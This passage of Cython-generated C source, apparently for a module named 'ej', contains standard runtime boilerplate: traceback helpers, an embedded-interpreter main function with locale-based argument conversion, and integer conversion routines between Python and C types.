PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        #else\n        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n        #endif\n    }\n    else {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromString(funcname);\n        if (!py_funcname) goto bad;\n        #endif\n    }\n    #if PY_MAJOR_VERSION < 3\n    py_code = __Pyx_PyCode_New(\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        __pyx_empty_bytes, /*PyObject *code,*/\n        __pyx_empty_tuple, /*PyObject *consts,*/\n        __pyx_empty_tuple, /*PyObject *names,*/\n        __pyx_empty_tuple, /*PyObject *varnames,*/\n        __pyx_empty_tuple, /*PyObject *freevars,*/\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\n        py_srcfile,   /*PyObject *filename,*/\n        py_funcname,  /*PyObject *name,*/\n        py_line,\n        __pyx_empty_bytes  /*PyObject *lnotab*/\n    );\n    Py_DECREF(py_srcfile);\n    #else\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    #endif\n    Py_XDECREF(py_funcname);  // XDECREF since it\'s only set on Py3 if cline\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_srcfile);\n    #endif\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            /* If the code object creation fails, then we should clear the\n               fetched exception references and propagate the new exception */\n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            /*PyThreadState *tstate,*/\n        py_code,           /*PyCodeObject *code,*/\n        __pyx_d,    /*PyObject *globals,*/\n        0                  /*PyObject *locals*/\n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n#endif\n\n/* MainFunction */\n#ifdef __FreeBSD__\n#include <floatingpoint.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv)\n#elif defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv)\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv)\n#endif\n{\n    /* 754 requires that FP exceptions run in "no stop" mode by default,\n     * and until C vendors implement C99\'s ways to control FP exceptions,\n     * Python requires non-stop mode.  Alas, some platforms enable FP\n     * exceptions by default.  Here we disable them.\n     */\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n#if PY_VERSION_HEX < 0x03080000\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n#endif\n    #if PY_MAJOR_VERSION < 3\n    if (PyImport_AppendInittab("ej", initej) < 0) return 1;\n    #else\n    if (PyImport_AppendInittab("ej", PyInit_ej) < 0) return 1;\n    #endif\n#if PY_VERSION_HEX < 0x03080000\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n#else\n    {\n        PyStatus status;\n        PyConfig config;\n        PyConfig_InitPythonConfig(&config);\n        config.parse_argv = 0;\n        if (argc && argv) {\n            status = PyConfig_SetString(&config, &config.program_name, argv[0]);\n            if (PyStatus_Exception(status)) {\n                PyConfig_Clear(&config);\n                return 1;\n            }\n            status = PyConfig_SetArgv(&config, argc, argv);\n            if (PyStatus_Exception(status)) {\n                PyConfig_Clear(&config);\n                return 1;\n            }\n        }\n        status = Py_InitializeFromConfig(&config);\n        if (PyStatus_Exception(status)) {\n            PyConfig_Clear(&config);\n            return 1;\n        }\n        PyConfig_Clear(&config);\n    }\n#endif\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_ej = 1;\n      m = PyImport_ImportModule("ej");\n      if (!m && PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)\n#include <locale.h>\n#if PY_VERSION_HEX < 0x03050000\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    /* Some platforms have a broken implementation of\n     * mbstowcs which does not count the characters that\n     * would result from conversion.  Use an upper bound.\n     */\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            /* Only use the result if it contains no\n               surrogate characters. */\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    /* Overallocate; as multi-byte characters are in the argument, the\n       actual output could use less memory. */\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            /* Incomplete character. This should never happen,\n               since we provide everything that we have -\n               unless there is a bug in the C library, or I\n               misunderstood how mbrtowc works. */\n            fprintf(stderr, "unexpected mbrtowc result -2\\\\n");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            /* Conversion error. Escape as UTF-8b, and start over\n               in the initial shift state. */\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            /* Surrogate character.  Escape the original\n               byte sequence with surrogateescape. */\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    /* Cannot use C locale for escaping; manually escape as if charset\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\n       correctly in the locale\'s charset, which must be an ASCII superset. */\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, "out of memory\\\\n");\n    return NULL;\n}\n#endif\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, "out of memory\\\\n");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, "");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] =\n#if PY_VERSION_HEX < 0x03050000\n                __Pyx_char2wchar(argv[i]);\n#else\n                Py_DecodeLocale(argv[i], NULL);\n#endif\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\n\n/* FormatTypeName */\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic __Pyx_TypeName\n__Pyx_PyType_GetName(PyTypeObject* tp)\n{\n    PyObject *name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,\n                                               __pyx_n_s_name);\n    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) {\n        PyErr_Clear();\n        Py_XDECREF(name);\n        name = __Pyx_NewRef(__pyx_n_s__20);\n    }\n    return name;\n}\n#endif\n\n/* CIntToPy */\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyInt_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyInt_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&value;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n#else\n        PyObject *from_bytes, *result = NULL;\n        PyObject *py_bytes = NULL, *arg_tuple = NULL, *kwds = NULL, *order_str = NULL;\n        from_bytes = PyObject_GetAttrString((PyObject*)&PyInt_Type, "from_bytes");\n        if (!from_bytes) return NULL;\n        py_bytes = PyBytes_FromStringAndSize((char*)bytes, sizeof(long));\n        if (!py_bytes) goto limited_bad;\n        order_str = PyUnicode_FromString(little ? "little" : "big");\n        if (!order_str) goto limited_bad;\n        arg_tuple = PyTuple_Pack(2, py_bytes, order_str);\n        if (!arg_tuple) goto limited_bad;\n        kwds = PyDict_New();\n        if (!kwds) goto limited_bad;\n        if (PyDict_SetItemString(kwds, "signed", __Pyx_NewRef(!is_unsigned ? Py_True : Py_False))) goto limited_bad;\n        result = PyObject_Call(from_bytes, arg_tuple, kwds);\n        limited_bad:\n        Py_XDECREF(from_bytes);\n        Py_XDECREF(py_bytes);\n        Py_XDECREF(order_str);\n        Py_XDECREF(arg_tuple);\n        Py_XDECREF(kwds);\n        return result;\n#endif\n    }\n}\n\n/* CIntFromPyVerify */\n#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n/* CIntFromPy */\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if ((sizeof(long) < sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (long) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n                goto raise_neg_overflow;\n            } else if (__Pyx_PyLong_IsCompact(x)) {\n                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n            } else {\n                const digit* digits = __Pyx_PyLong_Digits(x);\n                assert(__Pyx_PyLong_DigitCount(x) > 1);\n                switch (__Pyx_PyLong_DigitCount(x)) {\n                    case 2:\n                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {\n                                return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                            }\n                        }\n                        break;\n                    case 3:\n                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {\n                                return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                            }\n                        }\n                        break;\n                    case 4:\n                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {\n                                return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                            }\n                        }\n                        break;\n                }\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (long) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if ((sizeof(long) <= sizeof(unsigned long))) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            if (__Pyx_PyLong_IsCompact(x)) {\n                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n            } else {\n                const digit* digits = __Pyx_PyLong_Digits(x);\n                assert(__Pyx_PyLong_DigitCount(x) > 1);\n                switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                    case -2:\n                        if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                                return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                    case 2:\n                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                                return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                    case -3:\n                        if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                                return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                    case 3:\n                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                                return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                    case -4:\n                        if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                                return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                    case 4:\n                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                                return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                            }\n                        }\n                        break;\n                }\n            }\n#endif\n            if ((sizeof(long) <= sizeof(long))) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n            long val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n#if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n#endif\n            if (likely(v)) {\n                int ret = -1;\n#if !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                           bytes, sizeof(val),\n                                           is_little, !is_unsigned);\n#else\n                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n                int bits, remaining_bits, is_negative = 0;\n                long idigit;\n                int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n                if (unlikely(!PyLong_CheckExact(v))) {\n                    PyObject *tmp = v;\n                    v = PyNumber_Long(v);\n                    assert(PyLong_CheckExact(v));\n                    Py_DECREF(tmp);\n                    if (unlikely(!v)) return (long) -1;\n                }\n#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n                if (Py_SIZE(x) == 0)\n                    return (long) 0;\n                is_negative = Py_SIZE(x) < 0;\n#else\n                {\n                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                    if (unlikely(result < 0))\n                        return (long) -1;\n                    is_negative = result == 1;\n                }\n#endif\n                if (is_unsigned && unlikely(is_negative)) {\n                    goto raise_neg_overflow;\n                } else if (is_negative) {\n                    stepval = PyNumber_Invert(v);\n                    if (unlikely(!stepval))\n                        return (long) -1;\n                } else {\n                    stepval = __Pyx_NewRef(v);\n                }\n                val = (long) 0;\n                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n                for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {\n                    PyObject *tmp, *digit;\n                    digit = PyNumber_And(stepval, mask);\n                    if (unlikely(!digit)) goto done;\n                    idigit = PyLong_AsLong(digit);\n                    Py_DECREF(digit);\n                    if (unlikely(idigit < 0)) goto done;\n                    tmp = PyNumber_Rshift(stepval, shift);\n                    if (unlikely(!tmp)) goto done;\n                    Py_DECREF(stepval); stepval = tmp;\n                    val |= ((long) idigit) << bits;\n                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n                    if (Py_SIZE(stepval) == 0)\n                        goto unpacking_done;\n                    #endif\n                }\n                idigit = PyLong_AsLong(stepval);\n                if (unlikely(idigit < 0)) goto done;\n                remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);\n                if (unlikely(idigit >= (1L << remaining_bits)))\n                    goto raise_overflow;\n                val |= ((long) idigit) << bits;\n            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n            unpacking_done:\n            #endif\n                if (!is_unsigned) {\n                    if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))\n                        goto raise_overflow;\n                    if (is_negative)\n                        val = ~val;\n                }\n                ret = 0;\n            done:\n                Py_XDECREF(shift);\n                Py_XDECREF(mask);\n                Py_XDECREF(stepval);\n#endif\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n            return (long) -1;\n        }\n    } else {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyInt_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to long");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to long");\n    return (long) -1;\n}\n\n/* CIntFromPy */\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if ((sizeof(int) < sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (int) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n                goto raise_neg_overflow;\n            } else if (__Pyx_PyLong_IsCompact(x)) {\n                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n            } else {\n                const digit* digits = __Pyx_PyLong_Digits(x);\n                assert(__Pyx_PyLong_DigitCount(x) > 1);\n                switch (__Pyx_PyLong_DigitCount(x)) {\n                    case 2:\n                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {\n                                return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                            }\n                        }\n                        break;\n                    case 3:\n                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {\n                                return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                            }\n                        }\n                        break;\n                    case 4:\n                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {\n                                return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                            }\n                        }\n                        break;\n                }\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (int) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if ((sizeof(int) <= sizeof(unsigned long))) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            if 